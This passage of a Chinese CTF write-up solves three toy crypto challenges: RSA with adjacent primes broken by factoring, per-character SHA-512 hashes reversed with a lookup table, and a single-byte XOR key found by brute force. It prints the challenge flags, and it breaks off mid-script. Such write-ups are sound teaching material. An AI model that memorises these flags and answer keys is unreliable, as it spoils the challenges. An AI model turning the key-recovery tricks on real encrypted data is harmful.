<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1025</span>)</span><br><span class="line">q = <span class="built_in">int</span>(next_prime(p))</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061</span></span><br><span class="line"><span class="comment"># c = 702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220</span></span><br></pre></td></tr></table></figure>

<p>丢给GPT一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> factorint</span><br><span class="line"><span class="comment"># 已知的 n 和 c</span></span><br><span class="line">n = <span class="number">77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 sympy 来因式分解 n</span></span><br><span class="line">factors = factorint(n)  <span class="comment"># 因式分解 n</span></span><br><span class="line">p = <span class="built_in">list</span>(factors.keys())[<span class="number">0</span>]  <span class="comment"># 获取 p</span></span><br><span class="line">q = <span class="built_in">list</span>(factors.keys())[<span class="number">1</span>]  <span class="comment"># 获取 q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 φ(n)</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用欧几里得算法计算 e 对 φ(n) 的模逆 d</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥 d 解密 c</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 m 转换为 flag</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag：<code>flag&#123;oops_the_N_is_not_secure&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_NffLBGS3MR.png"></p>
<h2 id="Normal-One-Way-Function"><a href="#Normal-One-Way-Function" class="headerlink" title="[Normal] One_Way_Function"></a><strong>[Normal]</strong> One_Way_Function</h2><p>题目如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(sha512(<span class="built_in">bytes</span>([f])).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 711c22448e721e5491d8245b49425aa861f1fc4a15287f0735e203799b65cffec50b5abd0fddd91cd643aeb3b530d48f05e258e7e230a94ed5025c1387bb4e1b</span></span><br><span class="line"><span class="comment"># f10127742e07a7705735572f823574b89aaf1cbe071935cb9e75e5cfeb817700cb484d1100a10ad5c32b59c3d6565211108aa9ef0611d7ec830c1b66f60e614d</span></span><br><span class="line"><span class="comment"># 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75</span></span><br><span class="line"><span class="comment"># 19f142b018f307bfdf1c7009d15a29417c96d8678d2982eebce4961b2e67eeb118a8ebb1d75b70087c3e65bc793450e3fe4a10002befa2d038e5aed4796937f2</span></span><br><span class="line"><span class="comment"># c2d03c6efb16c3f8064b0d059e45f951f1748421a622571a52009ddcc2a670851e1ad0269fbd81d45856fa20ffacd081dd20fece7611420befb49eb984bc23ca</span></span><br><span class="line"><span class="comment"># 48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="comment"># a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="comment"># 48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="comment"># 31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68dbf3f3a5436ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99</span></span><br><span class="line"><span class="comment"># f05210c5b4263f0ec4c3995bdab458d81d3953f354a9109520f159db1e8800bcd45b97c56dce90a1fc27ab03e0b8a9af8673747023c406299374116d6f966981</span></span><br><span class="line"><span class="comment"># 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a</span></span><br><span class="line"><span class="comment"># 3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="comment"># 3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="comment"># 7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="comment"># 48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="comment"># 3c9ad55147a7144f6067327c3b82ea70e7c5426add9ceea4d07dc2902239bf9e049b88625eb65d014a7718f79354608cab0921782c643f0208983fffa3582e40</span></span><br><span class="line"><span class="comment"># 5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="comment"># 5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="comment"># 7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="comment"># a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="comment"># 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75</span></span><br><span class="line"><span class="comment"># 48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="comment"># 48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="comment"># 7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="comment"># 5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="comment"># 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a</span></span><br><span class="line"><span class="comment"># 0dc526d8c4fa04084f4b2a6433f4cd14664b93df9fb8a9e00b77ba890b83704d24944c93caa692b51085bb476f81852c27e793600f137ae3929018cd4c8f1a45</span></span><br><span class="line"><span class="comment"># a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="comment"># 7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="comment"># bc23b8b01772d2dd67efb8fe1a5e6bd0f44b97c36101be6cc09f253b53e68d67a22e4643068dfd1341980134ea57570acf65e306e4d96cef4d560384894c88a4</span></span><br><span class="line"><span class="comment"># acc28db2beb7b42baa1cb0243d401ccb4e3fce44d7b02879a52799aadff541522d8822598b2fa664f9d5156c00c924805d75c3868bd56c2acb81d37e98e35adc</span></span><br><span class="line"><span class="comment"># bc23b8b01772d2dd67efb8fe1a5e6bd0f44b97c36101be6cc09f253b53e68d67a22e4643068dfd1341980134ea57570acf65e306e4d96cef4d560384894c88a4</span></span><br><span class="line"><span class="comment"># 87c568e037a5fa50b1bc911e8ee19a77c4dd3c22bce9932f86fdd8a216afe1681c89737fada6859e91047eece711ec16da62d6ccb9fd0de2c51f132347350d8c</span></span><br><span class="line"><span class="comment"># 87c568e037a5fa50b1bc911e8ee19a77c4dd3c22bce9932f86fdd8a216afe1681c89737fada6859e91047eece711ec16da62d6ccb9fd0de2c51f132347350d8c</span></span><br><span class="line"><span class="comment"># acc28db2beb7b42baa1cb0243d401ccb4e3fce44d7b02879a52799aadff541522d8822598b2fa664f9d5156c00c924805d75c3868bd56c2acb81d37e98e35adc</span></span><br><span class="line"><span class="comment"># a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="comment"># 5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="comment"># 5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="comment"># 3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="comment"># 3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="comment"># 711c22448e721e5491d8245b49425aa861f1fc4a15287f0735e203799b65cffec50b5abd0fddd91cd643aeb3b530d48f05e258e7e230a94ed5025c1387bb4e1b</span></span><br><span class="line"><span class="comment"># 9220b9865a97d2eb9cad34271703f7c8e61cbe63a7a87d2aa3783f23669f14184eacda9a446f6c2f37e25426ec89542fdc9d8186fb5a8845e29896f920f9f1e3</span></span><br></pre></td></tr></table></figure>

<h3 id="麻烦点的做法"><a href="#麻烦点的做法" class="headerlink" title="麻烦点的做法"></a>麻烦点的做法</h3><p>都sha512了，那肯定不是爆破，找一个sha512的字典去碰去，找到了这个网站<a href="https://crackstation.net/">https://crackstation.net/</a></p>
<p>然后把内容丢进去，就能碰撞出flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/msedge_AQbWrZUwt7.png"></p>
<h3 id="简单点的做法"><a href="#简单点的做法" class="headerlink" title="简单点的做法"></a>简单点的做法</h3><p>就是写个脚本一把梭，因为很容易发现脚本里面是对单个字符进行了sha512的计算，所以可以直接建立一个映射，然后再把数据丢进去就可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> printable:</span><br><span class="line">    mapping[sha512(char.encode()).hexdigest()] = char</span><br><span class="line"></span><br><span class="line">data=<span class="string">&quot;&quot;&quot;711c22448e721e5491d8245b49425aa861f1fc4a15287f0735e203799b65cffec50b5abd0fddd91cd643aeb3b530d48f05e258e7e230a94ed5025c1387bb4e1b</span></span><br><span class="line"><span class="string">f10127742e07a7705735572f823574b89aaf1cbe071935cb9e75e5cfeb817700cb484d1100a10ad5c32b59c3d6565211108aa9ef0611d7ec830c1b66f60e614d</span></span><br><span class="line"><span class="string">1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75</span></span><br><span class="line"><span class="string">19f142b018f307bfdf1c7009d15a29417c96d8678d2982eebce4961b2e67eeb118a8ebb1d75b70087c3e65bc793450e3fe4a10002befa2d038e5aed4796937f2</span></span><br><span class="line"><span class="string">c2d03c6efb16c3f8064b0d059e45f951f1748421a622571a52009ddcc2a670851e1ad0269fbd81d45856fa20ffacd081dd20fece7611420befb49eb984bc23ca</span></span><br><span class="line"><span class="string">48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="string">a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="string">48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="string">31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68dbf3f3a5436ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99</span></span><br><span class="line"><span class="string">f05210c5b4263f0ec4c3995bdab458d81d3953f354a9109520f159db1e8800bcd45b97c56dce90a1fc27ab03e0b8a9af8673747023c406299374116d6f966981</span></span><br><span class="line"><span class="string">4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a</span></span><br><span class="line"><span class="string">3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="string">3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="string">7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="string">48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="string">3c9ad55147a7144f6067327c3b82ea70e7c5426add9ceea4d07dc2902239bf9e049b88625eb65d014a7718f79354608cab0921782c643f0208983fffa3582e40</span></span><br><span class="line"><span class="string">5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="string">5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="string">7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="string">a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="string">1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75</span></span><br><span class="line"><span class="string">48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="string">48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5</span></span><br><span class="line"><span class="string">7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="string">5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="string">4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a</span></span><br><span class="line"><span class="string">0dc526d8c4fa04084f4b2a6433f4cd14664b93df9fb8a9e00b77ba890b83704d24944c93caa692b51085bb476f81852c27e793600f137ae3929018cd4c8f1a45</span></span><br><span class="line"><span class="string">a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="string">7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d</span></span><br><span class="line"><span class="string">bc23b8b01772d2dd67efb8fe1a5e6bd0f44b97c36101be6cc09f253b53e68d67a22e4643068dfd1341980134ea57570acf65e306e4d96cef4d560384894c88a4</span></span><br><span class="line"><span class="string">acc28db2beb7b42baa1cb0243d401ccb4e3fce44d7b02879a52799aadff541522d8822598b2fa664f9d5156c00c924805d75c3868bd56c2acb81d37e98e35adc</span></span><br><span class="line"><span class="string">bc23b8b01772d2dd67efb8fe1a5e6bd0f44b97c36101be6cc09f253b53e68d67a22e4643068dfd1341980134ea57570acf65e306e4d96cef4d560384894c88a4</span></span><br><span class="line"><span class="string">87c568e037a5fa50b1bc911e8ee19a77c4dd3c22bce9932f86fdd8a216afe1681c89737fada6859e91047eece711ec16da62d6ccb9fd0de2c51f132347350d8c</span></span><br><span class="line"><span class="string">87c568e037a5fa50b1bc911e8ee19a77c4dd3c22bce9932f86fdd8a216afe1681c89737fada6859e91047eece711ec16da62d6ccb9fd0de2c51f132347350d8c</span></span><br><span class="line"><span class="string">acc28db2beb7b42baa1cb0243d401ccb4e3fce44d7b02879a52799aadff541522d8822598b2fa664f9d5156c00c924805d75c3868bd56c2acb81d37e98e35adc</span></span><br><span class="line"><span class="string">a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568</span></span><br><span class="line"><span class="string">5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="string">5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da</span></span><br><span class="line"><span class="string">3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="string">3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb</span></span><br><span class="line"><span class="string">711c22448e721e5491d8245b49425aa861f1fc4a15287f0735e203799b65cffec50b5abd0fddd91cd643aeb3b530d48f05e258e7e230a94ed5025c1387bb4e1b</span></span><br><span class="line"><span class="string">9220b9865a97d2eb9cad34271703f7c8e61cbe63a7a87d2aa3783f23669f14184eacda9a446f6c2f37e25426ec89542fdc9d8186fb5a8845e29896f920f9f1e3&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">    <span class="built_in">print</span>(mapping[line], end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行后可以得到flag为<code>flag&#123;d4d07133-d6bb-4add-b194-8c8eec4bb33f&#125;</code></p>
<h2 id="Normal-One-Key-Pad"><a href="#Normal-One-Key-Pad" class="headerlink" title="[Normal] One_Key_Pad"></a><strong>[Normal]</strong> One_Key_Pad</h2><p>代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append((f ^ key))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># e0eae7e1fde3e7fcffd9fee9f4fb</span></span><br></pre></td></tr></table></figure>

<p>发现是个异或操作，而且是单个字符异或，题目又说是<code>One_Key</code>，所以推测key为一个字符</p>
<p>写爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ciphertext_hex = <span class="string">&#x27;e0eae7e1fde3e7fcffd9fee9f4fb&#x27;</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    decrypted = [<span class="built_in">chr</span>(c ^ key) <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext]</span><br><span class="line">    decrypted_text = <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> decrypted_text.startswith(<span class="string">&#x27;fl&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found key: <span class="subst">&#123;<span class="built_in">chr</span>(key)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Decrypted text: <span 